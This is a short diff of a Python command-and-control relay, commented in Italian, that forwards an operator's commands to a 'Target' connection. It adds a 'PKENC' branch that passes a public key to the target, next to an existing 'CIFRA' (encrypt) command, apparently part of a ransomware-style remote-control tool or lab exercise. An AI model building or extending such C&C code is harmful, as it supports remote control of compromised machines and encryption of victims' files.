@@ -20,14 +20,20 @@ while True:
     # Riceve comando dall'operatore
     command = conn_operator.recv(1024)
     print(f"[C&C] Command received: {command.decode().strip()}")
-
+ 
     # Invia il comando al Target
     s2.send(command)
-    
+
+    # Ferma se è STOP
     if command.decode().strip().upper() == "STOP":
         print("[C&C] Connection closing.")
         break
-
+    
+    if command.decode().strip().upper().startswith("PKENC"):
+        pkey = s1.recv(1024)
+        s2.send(pkey)
+        
+        
     # Riceve l'output e inoltra
     if command.decode().strip().upper().startswith("CIFRA"):
         key_syn = s2.recv(1024)
